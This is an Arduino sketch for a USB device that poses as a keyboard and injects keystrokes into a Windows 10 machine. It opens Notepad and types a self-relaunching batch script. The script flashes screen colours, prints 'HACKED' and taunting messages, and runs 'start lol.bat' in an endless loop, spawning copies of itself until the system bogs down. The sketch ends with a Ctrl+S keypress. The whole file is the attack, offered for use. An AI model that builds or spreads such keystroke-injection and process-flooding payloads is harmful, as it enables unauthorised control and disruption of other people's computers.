/* This program is made for WINDOWS 10!! This program opens the search
bar then types "notepad", presses enter, then puts in the code for
lol.bat, a script I made to open itself and flash the screen. This program
was made by Leedl3 on 3/31/16
*/
char leftctrl = KEY_LEFT_CTRL;
char LeftArrow = KEY_LEFT_ARROW	;
char RightArrow = KEY_RIGHT_ARROW;
char UpArrow = KEY_UP_ARROW;
char DownArrow = KEY_DOWN_ARROW;
char alt = KEY_LEFT_ALT;
char wkey = KEY_LEFT_GUI;
char enter = KEY_RETURN;

void setup() {
  Keyboard.begin();
  delay(2000);
  Keyboard.press(wkey);
  delay(500);
  Keyboard.press('s');
  delay(250);
  Keyboard.releaseAll();
  Keyboard.print("notepad");
  delay(500);
  Keyboard.press(enter);
  delay(250);
  Keyboard.releaseAll();
  delay(250);
  Keyboard.println("@echo off");
  delay(500);
  Keyboard.println(":A");
  delay(500);
  Keyboard.println("color 82");
  delay(500);
  Keyboard.println("echo LOL XD N00BS @ Security! XP Yall make me laugh");
  delay(500);
  Keyboard.println("color A5");
  delay(500);
  Keyboard.println("echo HACKED");
  delay(500);
  Keyboard.println("start lol.bat");
  delay(500);
  Keyboard.println("goto A");
  delay(500);
  Keyboard.press(leftctrl);
  delay(500);
  Keyboard.press('s');
  delay(500);
  Keyboard.releaseAll();
}

void loop() {

}
